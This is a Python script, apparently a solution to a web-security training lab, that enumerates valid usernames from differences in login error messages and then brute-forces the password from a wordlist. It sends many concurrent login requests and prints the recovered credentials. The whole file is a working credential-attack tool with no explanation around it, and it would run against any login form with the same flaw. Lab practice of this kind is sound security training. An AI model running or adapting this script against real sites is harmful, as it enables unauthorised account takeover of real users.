import requests
import threading
import re

# Read username and password list
with open('username.txt', 'r') as file:
  usernames = [line.rstrip() for line in file]

with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0a9e000203bc6eba81d3c58c009b00bd.web-security-academy.net'

threads = []
username_ = ''
password_ = ''
error_infos = [''] * len(usernames)

# Get all unique error message
def error_message(username, i):
  data = { 'username' : username, 'password' : 'something' }
  response = requests.post(url = url + '/login', data = data)
  error_info = re.findall(r'<p class=is-warning>(.*?)</p>', response.text)[0]
  error_infos[i] = error_info
  
def username_enum(username, i):
  data = { 'username' : username, 'password' : 'something' }
  response = requests.post(url = url + '/login', data = data)
  if 'Invalid username or password.' not in response.text:
    global username_
    username_ = username

def find_password(username, password):
  data = { 'username' : username, 'password' : password }
  response = requests.post(url = url + '/login', data = data)
  if 'Invalid username or password' not in response.text:
    global password_
    password_ = password

# Create thread for find the error message
# for i in range(len(usernames)):
#   threads.append(threading.Thread(target=error_message, args=(usernames[i], i)))
#   threads[i].start()

# for i in range(len(usernames)):
#   threads[i].join()
  
# print(set(error_infos))

# Create a thread to enumerate the username
threads = []
for i in range(len(usernames)):
  threads.append(threading.Thread(target=username_enum, args=(usernames[i], i)))
  threads[i].start()

for i in range(len(usernames)):
  threads[i].join()
  

# print(username_)
threads = []
for i in range(len(passwords)):
  threads.append(threading.Thread(target=find_password, args=(username_,passwords[i],)))
  threads[i].start()

for i in range(len(passwords)):
  threads[i].join()
  
print(f'Credentials: {username_} - {password_}')